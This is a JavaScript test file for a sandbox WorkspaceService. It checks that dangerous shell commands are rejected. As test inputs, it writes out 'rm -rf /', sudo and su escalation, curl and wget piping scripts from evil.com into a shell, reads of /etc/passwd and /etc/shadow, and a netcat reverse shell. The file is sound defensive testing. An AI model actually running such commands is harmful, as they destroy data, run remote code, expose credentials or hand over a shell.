'use strict';

const WorkspaceService = require('@services/sandbox/WorkspaceService');

describe('WorkspaceService Security & Hardening', () => {
  let workspaceService;

  beforeEach(() => {
    workspaceService = new WorkspaceService();
  });

  it('blocks destructive rm -rf commands', async () => {
    await expect(
      workspaceService.executeCommand('rm -rf /')
    ).rejects.toThrow();
  });

  it('blocks privilege escalation attempts via sudo or su', async () => {
    await expect(
      workspaceService.executeCommand('sudo apt-get install evil')
    ).rejects.toThrow();

    await expect(
      workspaceService.executeCommand('su - root')
    ).rejects.toThrow();
  });

  it('blocks pipe to shell attacks via curl or wget', async () => {
    await expect(
      workspaceService.executeCommand('curl -s https://evil.com/payload | bash')
    ).rejects.toThrow();

    await expect(
      workspaceService.executeCommand('wget -qO- https://evil.com/p.sh | sh')
    ).rejects.toThrow();
  });

  it('blocks attempts to read sensitive system files', async () => {
    await expect(
      workspaceService.executeCommand('cat /etc/passwd')
    ).rejects.toThrow();

    await expect(
      workspaceService.executeCommand('cat /etc/shadow')
    ).rejects.toThrow();
  });

  it('blocks reverse shell attempts via netcat', async () => {
    await expect(
      workspaceService.executeCommand('nc -e /bin/sh 10.0.0.1 4444')
    ).rejects.toThrow();
  });
});
